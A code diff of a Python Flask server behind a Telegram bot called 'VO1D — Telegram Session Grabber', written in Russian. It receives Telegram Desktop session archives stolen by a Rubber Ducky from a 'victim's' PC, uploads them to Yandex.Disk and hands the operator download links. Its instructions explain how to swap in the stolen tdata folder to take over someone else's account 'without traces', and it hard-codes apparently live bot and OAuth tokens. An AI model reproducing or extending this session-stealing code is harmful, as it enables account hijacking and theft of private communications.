@@ -3,7 +3,6 @@ import json
 import os
 from datetime import datetime
 import requests
-import base64
 
 app = Flask(__name__)
 
@@ -14,10 +13,9 @@ TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
 TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
 
 # ============================================================
-# ПАПКА ДЛЯ ЛОГОВ
+# ТОКЕН ЯНДЕКС.ДИСКА
 # ============================================================
-LOG_DIR = "logs"
-os.makedirs(LOG_DIR, exist_ok=True)
+YANDEX_TOKEN = "y0__wgBEIeRtIEJGNuWAyDAj-LOGGtaBiLfE7TenenIpgXVOd0Rlgkp"
 
 # ============================================================
 # ОТПРАВКА СООБЩЕНИЙ
@@ -29,19 +27,14 @@ def send_message(chat_id, text, keyboard=None):
         payload["reply_markup"] = json.dumps(keyboard)
     requests.post(url, json=payload)
 
-def send_file(chat_id, file_path, caption=""):
-    url = f"{TELEGRAM_API}/sendDocument"
-    with open(file_path, 'rb') as f:
-        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": f})
-
 # ============================================================
 # КЛАВИАТУРА
 # ============================================================
 def get_keyboard():
     return {
         "keyboard": [
-            ["📊 Логи сессий", "📥 Моя сессия"],
-            ["📖 Инструкция", "🗑️ Очистить"]
+            ["📥 Получить ссылку", "📊 Мои сессии"],
+            ["📖 Инструкция", "🗑️ Очистить всё"]
         ],
         "resize_keyboard": True,
         "one_time_keyboard": False
@@ -63,35 +56,28 @@ def webhook():
         send_message(
             chat_id,
             "🖤 **VO1D — Telegram Session Grabber**\n\n"
-            "Я принимаю Telegram сессии от Rubber Ducky.\n"
+            "Сессии сохраняются на Яндекс.Диск.\n"
             "Просто вставь флешку в компьютер жертвы.\n\n"
             "Выбери действие:",
             get_keyboard()
         )
     
-    elif text == "📊 Логи сессий":
+    elif text == "📥 Получить ссылку":
+        link = get_latest_link()
+        if not link:
+            send_message(chat_id, "📭 **Нет сессий**")
+        else:
+            send_message(chat_id, f"🔗 **Ссылка на сессию:**\n\n{link}")
+    
+    elif text == "📊 Мои сессии":
         files = get_logs()
         if not files:
             send_message(chat_id, "📭 **Нет сессий**")
         else:
-            msg = "📊 **Список сессий:**\n\n"
-            for f in files[:10]:
+            msg = "📊 **Твои сессии:**\n\n"
+            for f in files:
                 msg += f"📄 `{f}`\n"
             send_message(chat_id, msg)
-    
-    elif text == "📥 Моя сессия":
-        files = get_logs()
-        if not files:
-            send_message(chat_id, "📭 **Нет сессий**")
-            return "OK", 200
-        
-        # Берём последнюю сессию
-        latest = files[0]
-        path = os.path.join(LOG_DIR, latest)
-        
-        # Отправляем файл
-        with open(path, 'rb') as f:
-            send_file(chat_id, path, caption=f"📁 **Сессия:** {latest}\n\nДекодируй:\n`certutil -decode {latest} session.zip`")
     
     elif text == "📖 Инструкция":
         send_message(
@@ -99,25 +85,69 @@ def webhook():
             "📖 **ИНСТРУКЦИЯ**\n\n"
             "1️⃣ Вставь Rubber Ducky в ПК жертвы\n"
             "2️⃣ Скрипт скопирует Telegram сессию\n"
-            "3️⃣ Сессия придёт сюда\n"
-            "4️⃣ Нажми '📥 Моя сессия' — скачай файл\n"
-            "5️⃣ Декодируй:\n"
-            "   `certutil -decode имя_файла.b64 session.zip`\n"
-            "6️⃣ Распакуй архив\n"
-            "7️⃣ Замени папку `%AppData%\\Telegram Desktop\\tdata`\n"
-            "8️⃣ Запусти Telegram — ты в чужом аккаунте!\n\n"
+            "3️⃣ Сессия загружается на Яндекс.Диск\n"
+            "4️⃣ Нажми '📥 Получить ссылку' — получишь прямую ссылку\n"
+            "5️⃣ Скачай архив и распакуй\n"
+            "6️⃣ Замени папку `%AppData%\\Telegram Desktop\\tdata`\n"
+            "7️⃣ Запусти Telegram — ты в чужом аккаунте!\n\n"
             "⚡ **VO1D — тихо, быстро, без следов.**"
         )
     
-    elif text == "🗑️ Очистить":
-        for f in os.listdir(LOG_DIR):
-            os.remove(os.path.join(LOG_DIR, f))
+    elif text == "🗑️ Очистить всё":
+        clear_yandex_disk()
         send_message(chat_id, "✅ **Все сессии удалены**")
     
     else:
         send_message(chat_id, "❓ Используй кнопки.", get_keyboard())
     
     return "OK", 200
+
+# ============================================================
+# РАБОТА С ЯНДЕКС.ДИСКОМ
+# ============================================================
+def get_latest_link():
+    try:
+        # Получаем список файлов на Яндекс.Диске
+        url = "https://cloud-api.yandex.net/v1/disk/resources/files?limit=1&media_type=compressed"
+        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
+        if resp.status_code != 200:
+            return None
+        data = resp.json()
+        if not data.get("items"):
+            return None
+        path = data["items"][0]["path"]
+        # Получаем публичную ссылку
+        pub_url = "https://cloud-api.yandex.net/v1/disk/resources/publish"
+        resp = requests.put(pub_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"}, params={"path": path})
+        if resp.status_code != 200:
+            return None
+        link = resp.json().get("href")
+        return link
+    except:
+        return None
+
+def get_logs():
+    try:
+        url = "https://cloud-api.yandex.net/v1/disk/resources/files?media_type=compressed"
+        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
+        if resp.status_code != 200:
+            return []
+        data = resp.json()
+        return [item["name"] for item in data.get("items", [])]
+    except:
+        return []
+
+def clear_yandex_disk():
+    try:
+        url = "https://cloud-api.yandex.net/v1/disk/resources/files?media_type=compressed"
+        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
+        if resp.status_code != 200:
+            return
+        for item in resp.json().get("items", []):
+            delete_url = f"https://cloud-api.yandex.net/v1/disk/resources?path={item['path']}"
+            requests.delete(delete_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
+    except:
+        pass
 
 # ============================================================
 # ПРИНИМАЕТ POST ОТ RUBBER DUCKY
@@ -127,35 +157,32 @@ def grab():
     try:
         data = request.get_json()
         if not data:
-            data = {"raw": request.get_data(as_text=True)}
-
-        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.b64"
-        path = os.path.join(LOG_DIR, name)
+            return jsonify({"error": "No data"}), 400
 
         # Если пришла Base64 строка
         if "telegram" in data and data["telegram"]:
-            with open(path, 'w') as f:
-                f.write(data["telegram"])
+            import base64
+            b64_data = data["telegram"]
+            # Декодируем Base64 в ZIP
+            zip_data = base64.b64decode(b64_data)
+            
+            # Загружаем на Яндекс.Диск
+            name = f"tg_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+            upload_url = "https://cloud-api.yandex.net/v1/disk/resources/upload"
+            resp = requests.get(upload_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"}, params={"path": name, "overwrite": True})
+            if resp.status_code != 200:
+                return jsonify({"error": "Yandex upload failed"}), 500
+            upload_href = resp.json()["href"]
+            requests.put(upload_href, data=zip_data, headers={"Content-Type": "application/zip"})
+            
             print(f"[+] Saved TG session: {name}")
+            return jsonify({"status": "OK", "file": name}), 200
         else:
-            # Сохраняем всё в JSON
-            name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-            path = os.path.join(LOG_DIR, name)
-            with open(path, 'w', encoding='utf-8') as f:
-                json.dump(data, f, indent=2, ensure_ascii=False)
-
-        return jsonify({"status": "OK", "file": name}), 200
+            return jsonify({"error": "No telegram data"}), 400
 
     except Exception as e:
         print(f"[-] Error: {e}")
         return jsonify({"error": str(e)}), 500
-
-# ============================================================
-# ВСПОМОГАТЕЛЬНЫЕ
-# ============================================================
-def get_logs():
-    files = [f for f in os.listdir(LOG_DIR)]
-    return sorted(files, reverse=True)
 
 # ============================================================
 # ЗАПУСК
